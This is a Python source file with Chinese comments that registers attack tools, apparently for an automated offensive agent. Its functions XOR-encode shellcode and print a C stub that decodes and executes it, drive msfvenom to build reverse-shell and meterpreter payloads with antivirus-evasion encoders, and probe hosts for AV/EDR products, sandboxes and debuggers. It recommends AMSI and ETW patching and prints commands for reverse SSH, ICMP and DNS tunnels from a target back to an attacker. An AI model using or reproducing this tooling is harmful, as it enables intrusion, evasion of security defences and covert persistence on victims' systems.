"""对抗规避工具集

覆盖:
1. Shellcode 编码混淆 (XOR/alpha encoder)
2. AMSI/ETW patch (Windows)
3. 流量加密隧道 (反向 SSH/ICMP/DNS)
4. 反检测: 检查 AV/EDR、清理痕迹
5. 免杀: msfvenom 编码、分段加载
"""
import os
import base64
import subprocess
import tempfile
import logging
from config import config
from tools.base import register_tool, run_cmd

logger = logging.getLogger(__name__)


def _run(cmd, timeout=180):
    """执行命令（超时整组强杀，防子进程挂死）"""
    return run_cmd(cmd, timeout=timeout)


@register_tool(
    name="shellcode_encode",
    description="""Shellcode 编码混淆，绕过静态检测。

编码方式:
- xor:     单字节 XOR 编码 (附带解码器)
- alpha:   alphanumeric encoder (FPU)
- xor_multi: 多字节 XOR (更强混淆)
- base64:  base64 编码 (需自行解码)

输出: 编码后的 shellcode (hex 格式) 和对应的解码器 stub。

适合: 免杀、绕过 AV 静态扫描。
""",
    parameters={
        "type": "object",
        "properties": {
            "shellcode": {
                "type": "string",
                "description": "原始 shellcode (hex 格式，如 'fc4883e4f0')",
            },
            "method": {
                "type": "string",
                "enum": ["xor", "alpha", "xor_multi", "base64"],
                "description": "编码方式，默认 xor",
            },
            "key": {
                "type": "string",
                "description": "XOR 密钥 (1 字节 hex，如 '0x41')。不指定则自动选择",
            },
        },
        "required": ["shellcode"],
    },
)
def shellcode_encode(shellcode: str, method: str = "xor",
                     key: str = "") -> str:
    """Shellcode 编码"""
    try:
        # 解析 hex shellcode
        clean = shellcode.replace("\\x", "").replace(" ", "").replace("0x", "")
        sc_bytes = bytes.fromhex(clean)
    except ValueError as e:
        return f"[错误] shellcode 格式无效: {e}"

    results = [f"🔐 Shellcode 编码 ({method})"]
    results.append(f"原始长度: {len(sc_bytes)} 字节")

    if method == "xor":
        # 单字节 XOR
        if key:
            try:
                xor_key = int(key, 16) if key.startswith("0x") else int(key, 16)
            except ValueError:
                return f"[错误] 密钥格式无效，应为 hex 如 '0x41'"
        else:
            xor_key = 0x41  # 默认 'A'

        encoded = bytes(b ^ xor_key for b in sc_bytes)
        results.append(f"XOR 密钥: 0x{xor_key:02x}")
        results.append(f"编码后 hex: {encoded.hex()}")
        results.append(f"\n[C 解码器 stub]")
        results.append(f"""unsigned char sc[] = "{encoded.hex()}";
unsigned char key = 0x{xor_key:02x};
for (int i = 0; i < sizeof(sc); i++) sc[i] ^= key;
((void(*)())sc)();""")

    elif method == "xor_multi":
        # 多字节 XOR (4 字节密钥)
        xor_key = b"\x41\x42\x43\x44"
        encoded = bytes(sc_bytes[i] ^ xor_key[i % 4] for i in range(len(sc_bytes)))
        results.append(f"多字节 XOR 密钥: {xor_key.hex()}")
        results.append(f"编码后 hex: {encoded.hex()}")

    elif method == "base64":
        encoded = base64.b64encode(sc_bytes)
        results.append(f"Base64: {encoded.decode()}")

    elif method == "alpha":
        # 使用 msfvenom 的 alpha2 encoder
        with tempfile.NamedTemporaryFile(suffix=".bin", delete=False) as f:
            f.write(sc_bytes)
            raw_path = f.name

        try:
            r = _run([
                "msfvenom",
                "-p", "raw",
                "-f", "python",
                "-e", "x86/alpha_mixed",
                "-i", raw_path,
            ], timeout=60)

            if "payload" in r.lower() or "buf" in r.lower():
                results.append(f"\n[Alpha 编码结果]\n{r[:3000]}")
            else:
                results.append(f"[msfvenom 失败] {r[:500]}")
        finally:
            os.unlink(raw_path)

    return "\n".join(results)


@register_tool(
    name="msfvenom_payload",
    description="""使用 msfvenom 生成 payload，支持多种编码和格式。

常用 payload:
- linux/x64/shell_reverse_tcp
- linux/x64/exec CMD=/bin/sh
- windows/x64/shell_reverse_tcp
- python/meterpreter/reverse_tcp
- generic/shell_reverse_tcp

常用格式:
- raw:    原始 shellcode
- python: Python 字节数组
- c:      C 数组
- elf:    Linux 可执行文件
- exe:    Windows EXE

编码器 (免杀):
- x86/shikata_ga_nai: 多态编码器
- x64/xor_dynamic:    动态 XOR
- x86/countdown:      倒计时编码

适合: 生成免杀 payload、自动化利用。
""",
    parameters={
        "type": "object",
        "properties": {
            "payload": {"type": "string", "description": "payload 类型，如 'linux/x64/shell_reverse_tcp'"},
            "lhost": {"type": "string", "description": "反弹 shell 的监听 IP"},
            "lport": {"type": "string", "description": "反弹 shell 的监听端口"},
            "format": {
                "type": "string",
                "description": "输出格式，默认 raw",
            },
            "encoder": {
                "type": "string",
                "description": "编码器，如 'x86/shikata_ga_nai'。可多次编码: 'x86/shikata_ga_nai -i 3'",
            },
            "extra_args": {"type": "string", "description": "额外参数"},
        },
        "required": ["payload"],
    },
)
def msfvenom_payload(payload: str, lhost: str = "", lport: str = "",
                     format: str = "raw", encoder: str = "",
                     extra_args: str = "") -> str:
    """msfvenom 生成 payload"""
    cmd = ["msfvenom", "-p", payload]

    if lhost:
        cmd.append(f"LHOST={lhost}")
    if lport:
        cmd.append(f"LPORT={lport}")

    cmd.extend(["-f", format])

    if encoder:
        cmd.extend(["-e", encoder])

    if extra_args:
        cmd.extend(extra_args.split())

    # 保存到文件
    output_path = os.path.join(config.OUTPUT_DIR, f"payload_{payload.replace('/', '_')}.{format}")
    cmd.extend(["-o", output_path])

    r = _run(cmd, timeout=120)

    if os.path.exists(output_path):
        size = os.path.getsize(output_path)
        results = [
            f"[Payload 生成成功]",
            f"路径: {output_path}",
            f"大小: {size} bytes",
            f"格式: {format}",
        ]
        # 预览内容
        with open(output_path, "rb") as f:
            content = f.read(500)
        results.append(f"\n[内容预览]\n{content}")
        return "\n".join(results)
    else:
        return f"[msfvenom 失败]\n{r}"


@register_tool(
    name="evade_check",
    description="""对抗规避环境检测。

检测当前环境的安全防护:
1. AV/EDR 进程检查 (Windows Defender, CrowdStrike, SentinelOne 等)
2. 沙箱特征检测 (vmware, virtualbox, qemu)
3. 调试器检测 (gdb, strace, ltrace)
4. 网络监控检测 (tcpdump, wireshark)
5. 分析工具检测 (IDA, Ghidra, x64dbg)

输出: 检测到的安全工具和规避建议。

适合: 渗透测试前侦察、malware 开发环境检测。
""",
    parameters={
        "type": "object",
        "properties": {
            "platform": {
                "type": "string",
                "enum": ["linux", "windows", "auto"],
                "description": "目标平台，默认 auto (自动检测)",
            },
        },
    },
)
def evade_check(platform: str = "auto") -> str:
    """对抗规避检测"""
    results = ["🛡️ 对抗规避环境检测"]

    # 检测运行平台
    if platform == "auto":
        r = _run(["uname", "-s"])
        if "Linux" in r:
            platform = "linux"
        elif "MINGW" in r or "MSYS" in r:
            platform = "windows"
        else:
            platform = "linux"

    results.append(f"平台: {platform}")

    if platform == "linux":
        # 检查 AV/EDR
        av_processes = [
            "clamd", "clamav", "sophos", "avgd", "f-prot",
            "kaspersky", "bitdefender", "esets",
        ]
        r = _run(["bash", "-c", "ps aux 2>/dev/null | grep -iE '" + "|".join(av_processes) + "' | grep -v grep"])
        if r and "[无输出]" not in r:
            results.append(f"\n⚠️ [检测到 AV 进程]\n{r[:500]}")
        else:
            results.append("\n[未检测到 AV 进程]")

        # 检查调试/分析工具
        debug_tools = ["gdb", "strace", "ltrace", "ida", "ghidra", "radare", "r2", "wireshark", "tcpdump"]
        r = _run(["bash", "-c", "ps aux 2>/dev/null | grep -iE '" + "|".join(debug_tools) + "' | grep -v grep | head -10"])
        if r and "[无输出]" not in r:
            results.append(f"\n⚠️ [检测到分析工具]\n{r[:500]}")

        # 检查沙箱特征
        r = _run(["bash", "-c", """
            # VMware
            if [ -f /proc/scsi/scsi ]; then grep -i vmware /proc/scsi/scsi 2>/dev/null; fi
            # VirtualBox
            ls -la /proc/1/root 2>/dev/null | grep -i vbox
            # 检查 MAC 地址前缀
            ip link 2>/dev/null | grep -iE '00:05:69|00:0C:29|00:50:56'  # VMware
            ip link 2>/dev/null | grep -iE '08:00:27'  # VirtualBox
        """])
        if r and "[无输出]" not in r:
            results.append(f"\n⚠️ [检测到虚拟机特征]\n{r[:300]}")

        # 检查 seccomp/AppArmor
        r = _run(["bash", "-c", "cat /proc/1/status 2>/dev/null | grep -i seccomp; ls /etc/apparmor.d 2>/dev/null | head -5"])
        if r and "[无输出]" not in r:
            results.append(f"\n[安全沙箱]\n{r[:300]}")

    elif platform == "windows":
        # Windows 检测 (需要 wine 或在 Windows 上运行)
        av_processes = [
            "MsMpEng", "MpCmdRun",  # Defender
            "CSFalconService",       # CrowdStrike
            "SentinelAgent",         # SentinelOne
            "TmPfw",                 # TrendMicro
        ]
        r = _run(["bash", "-c", "tasklist 2>/dev/null | grep -iE '" + "|".join(av_processes) + "'"])
        if r and "[无输出]" not in r:
            results.append(f"\n⚠️ [检测到 EDR/AV]\n{r[:500]}")

    # 规避建议
    results.append("\n💡 [规避建议]")
    results.append("  • 静态免杀: shellcode 编码 (XOR/alpha2) + 加密存储")
    results.append("  • 动态免杀: 延时执行 + 环境检测 + 反调试")
    results.append("  • 内存加载: reflectively load DLL/shellcode")
    results.append("  • AMSI bypass: patch AmsiScanBuffer")
    results.append("  • ETW bypass: patch EtwEventWrite")
    results.append("  • 分段加载: stageless → staged, 多阶段投递")

    return "\n".join(results)


@register_tool(
    name="tunnel_setup",
    description="""建立加密隧道，绕过网络监控和防火墙。

支持的隧道类型:
- ssh_reverse:  反向 SSH 隧道 (目标→攻击者)
- ssh_dynamic:  SSH SOCKS5 代理 (通过跳板机访问内网)
- icmp_tunnel:  ICMP 隧道 (绕过防火墙)
- dns_tunnel:   DNS 隧道 (绕过只允许 DNS 出网的环境)

适合: 多阶段渗透中建立持久化通道、绕过网络限制。
""",
    parameters={
        "type": "object",
        "properties": {
            "tunnel_type": {
                "type": "string",
                "enum": ["ssh_reverse", "ssh_dynamic", "icmp_tunnel", "dns_tunnel"],
                "description": "隧道类型",
            },
            "lhost": {"type": "string", "description": "攻击者 IP (接收反向连接)"},
            "lport": {"type": "string", "description": "攻击者监听端口"},
            "rhost": {"type": "string", "description": "跳板机 IP (ssh_dynamic 用)"},
            "rport": {"type": "string", "description": "跳板机 SSH 端口"},
            "user": {"type": "string", "description": "SSH 用户名"},
        },
        "required": ["tunnel_type"],
    },
)
def tunnel_setup(tunnel_type: str, lhost: str = "", lport: str = "",
                 rhost: str = "", rport: str = "22",
                 user: str = "root") -> str:
    """建立隧道"""
    results = [f"🚇 隧道建立: {tunnel_type}"]

    if tunnel_type == "ssh_reverse":
        # 目标机上执行，反弹 SSH 到攻击者
        if not all([lhost, lport]):
            return "[错误] 需要 lhost 和 lport 参数"
        results.append(f"在目标机上执行:")
        results.append(f"  ssh -fNR {lport}:localhost:22 {user}@{lhost}")
        results.append(f"\n攻击者监听:")
        results.append(f"  ssh -p {lport} {user}@localhost")

    elif tunnel_type == "ssh_dynamic":
        # 通过跳板机建立 SOCKS5 代理
        if not all([rhost, lport]):
            return "[错误] 需要 rhost 和 lport 参数"
        results.append(f"建立 SOCKS5 代理:")
        results.append(f"  ssh -D {lport} -p {rport} {user}@{rhost} -N")
        results.append(f"\n配置 proxychains:")
        results.append(f"  echo 'socks5 127.0.0.1 {lport}' >> /etc/proxychains.conf")
        results.append(f"\n通过代理访问内网:")
        results.append(f"  proxychains nmap -sT -Pn 10.0.0.0/24")

    elif tunnel_type == "icmp_tunnel":
        # ICMP 隧道 (需要 pingtunnel 或类似工具)
        results.append("ICMP 隧道 (需要 icmptunnel 或 pingtunnel):")
        results.append("\n攻击者 (服务器端):")
        results.append("  # 编译并运行")
        results.append("  git clone https://github.com/DhavalKapil/icmptunnel")
        results.append("  cd icmptunnel && make")
        results.append("  ./icmptunnel -s  # 服务器模式")
        results.append("\n目标 (客户端):")
        results.append(f"  ./icmptunnel {lhost}")
        results.append("\n💡 用途: 绕过只允许 ICMP 出网的防火墙")

    elif tunnel_type == "dns_tunnel":
        # DNS 隧道 (需要 iodine 或 dnscat2)
        results.append("DNS 隧道 (使用 iodine):")
        results.append("\n攻击者 (DNS 服务器):")
        results.append("  # 需要 NS 记录指向你的服务器")
        results.append(f"  iodined -f -P password 10.0.0.1 tunnel.example.com")
        results.append("\n目标 (客户端):")
        results.append(f"  iodine -f -P password tunnel.example.com")
        results.append("\n💡 用途: 绕过只允许 DNS 出网的环境")
        results.append("💡 替代方案: dnscat2 (更隐蔽)")

    return "\n".join(results)
